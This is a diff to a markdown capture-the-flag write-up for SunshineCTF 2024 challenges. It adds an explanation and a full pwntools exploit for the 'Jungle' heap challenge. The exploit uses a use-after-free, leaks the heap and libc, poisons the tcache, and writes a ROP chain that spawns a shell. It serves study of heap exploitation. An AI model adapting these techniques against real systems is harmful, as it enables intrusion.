@@ -438,6 +438,7 @@ After that it allows you to write an index out of bounds three times.
 Then it allocates another chunk of the same size, and allows three
 more writes.
 
+### Goal
 The simple solution is to overwrite the tcache\_perthread\_struct
 which resides at the beginning of the heap. 
 
@@ -446,7 +447,7 @@ beginning of a heap and is used as the management structure
 of the tcache similar to the main\_arena.
 
 
-```
+```c
 typedef struct tcache_perthread_struct
 
 {
@@ -463,7 +464,7 @@ typedef struct tcache_perthread_struct
 
 ```
 
-```
+```c
 typedef struct tcache_entry
 
 {
@@ -480,18 +481,17 @@ an entry in the specific tcachesize.
 
 > We need to make sure our tcache\_entry and tcache\_count is the same as our chunk size
 
-
 Then the second malloc will allocate on the stack. After that
 we can do a simple ret2win.
 
-```
+```python3
 #! /usr/bin/python
 from pwn import *
 
 context.update(
         arch="amd64",
         endian="little",
-        log_level="info",
+        log\_level="info",
         os="linux",
         terminal=["alacritty", "-e"]
 )
@@ -501,7 +501,7 @@ ru = lambda p,s: p.recvuntil(s, timeout=to)
 rl = lambda p: p.recvline()
 sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
 sl = lambda p,a: p.sendline(a)
-up = lambda b: int.from_bytes(b, byteorder="little")
+up = lambda b: int.from\_bytes(b, byteorder="little")
 
 SERVICE = "2024.sunshinectf.games"
 PORT =  24006
@@ -522,7 +522,7 @@ def start(binary):
     else:
         return process(binary)
 
-def align_chunk(addr):
+def align\_chunk(addr):
     return (addr + 0x20) & 0xfffffffffffffff0
 
 def exploit(p,e):
@@ -583,6 +583,182 @@ if __name__=="__main__":
 
 ## Jungle
 
+This challenge is another heap note that allows us to edit, view, and free.
+We are given six chunks of size 0x50, meaning that we can only use tcache chunks
+here. This challenge is also running libc 2.35 meaning that we will most likely
+have to write our rop chain to the stack.
+
+### Use after free
+
+The vulnerability here is a use after free when calling remove twice on a chunk.
+What happens in the first call is that free is called, then the used field is set to
+zero. On the next remove, that used flag is set back to one, allowing us to edit a freed
+chunk.
+
+So our plan is to first leak the tcache pointer mangle key, which is the start of the heap >> 12,
+and then leak libc.
+
+After that we should leak the stack from libc environ, and then allocate a chunk over our 
+return address to \_\_libc\_start\_main.
+
+### Leaking tcache and libc
+
+For our tcache leak, we'll remove an item twice and then view it.
+This will let us view the tcache pointer mangle as it is 
+mangle\_key ^ next\_ptr and since next\_ptr is 0, we get the key.
+
+
+For our libc leak, if we edit with the string "Genie", we will 
+get a leak to printf. 
+
+### Tcache Poisioning
+
+For our tcache poisioning we'll do these steps:
+
+1. remove chunk A
+2. remove chunk B
+3. remove victim chunk C
+4. remove victim chunk C
+5. create victim chunk C to target ^ tcache mangle
+6. create chunk B
+7. create chunk A overlapping target
 
 
 
+### Exploit Script
+
+```python3
+
+#! /usr/bin/python
+from pwn import *
+
+context.update(
+        arch="amd64",
+        endian="little",
+        log_level="info",
+        os="linux",
+        terminal=["alacritty", "-e"]
+)
+
+to = 2
+ru = lambda p,s: p.recvuntil(s, timeout=to)
+rl = lambda p: p.recvline()
+sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
+sl = lambda p,a: p.sendline(a)
+up = lambda b: int.from_bytes(b, byteorder="little")
+
+SERVICE = "2024.sunshinectf.games"
+PORT = 24005
+
+def start(binary):
+
+    gs = '''
+        set context-sections stack regs disasm
+        set show-compact-regs on
+        set resolve-heap-via-heuristic on
+        set follow-fork-mode parent
+    '''
+
+    if args.GDB:
+        return gdb.debug(binary, gdbscript=gs)
+    elif args.REMOTE:
+        return remote(SERVICE,PORT)
+    else:
+        return process(binary)
+
+def create(p, index, value):
+    ru(p,b"Enter your choice >>>")
+    sl(p,b"2")
+    ru(p,b"Select a pocket to place an item in (1-6) >>> ")
+    sl(p,b"%i" % index)
+    ru(p,b"name >>>")
+    sl(p,value)
+
+def use(p, index):
+    ru(p,b"Enter your choice >>>")
+    sl(p,b"1")
+    ru(p,b"Use item from which pocket (1-6) >>>")
+    sl(p,"%i" % index)
+    ru(p,b"Using item from pocket %d: " % index)
+
+    return rl(p).strip(b'\n')
+
+def delete(p, index):
+    ru(p,b"Enter your choice >>>")
+    sl(p,b"3")
+    ru(p,b"Select a pocket to remove an item from (1-6) >>>")
+    sl(p,"%i" % index)
+
+def generate_rop_chain(l):
+    r = ROP(l)
+
+    chain = p64(r.find_gadget(["ret"])[0]) * 2
+    chain += p64(r.find_gadget(["pop rdi", "ret"])[0])
+    chain += p64(next(l.search(b"/bin/sh\x00")))
+    chain += p64(l.sym["system"])
+
+    return chain
+
+
+def exploit(p,e,l):
+
+    delete(p,1)
+    delete(p,1)
+
+    tcache_mangle = up(use(p,1))
+    heap_leak = tcache_mangle << 12
+    log.info(f"Leaked tcache mangle key {hex(tcache_mangle)}")
+    log.info(f"Leaked heap {hex(heap_leak)}")
+
+    create(p,5,b"Genie")
+    use(p,5)
+
+    ru(p,b" secret starting point:")
+    l.address = int(rl(p),16) - l.sym["printf"]
+
+    log.info(f"Leaked libc base address {hex(l.address)}")
+
+    target = (l.sym["environ"] - 0x18) ^ tcache_mangle
+
+    delete(p,2)
+    delete(p,3)
+    delete(p,4)
+    delete(p,4)
+
+    create(p,4,p64(target))
+    create(p,3,b"A")
+    create(p,2,b"A"*0x17)
+
+    use(p,2)
+
+    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
+    log.info(f"Leaked stack from libc environ {hex(stack_leak)}")
+
+    delete(p,3)
+    delete(p,6)
+    delete(p,5)
+    delete(p,5)
+
+    target = ((stack_leak - 0x148) & 0xfffffffffffffff0) ^ tcache_mangle
+
+    log.info(f"Sending rop chain at {hex(target ^ tcache_mangle)}")
+
+    create(p,5,p64(target))
+    create(p,6,b"A")
+    create(p,3,generate_rop_chain(l))
+
+    for i in range(5):
+        use(p,1)
+
+    p.interactive()
+
+
+if __name__=="__main__":
+    file = args.BIN
+
+    p = start(file)
+    e = context.binary = ELF(file)
+    l = ELF("./libc.so.6")
+
+    exploit(p,e,l)
+```
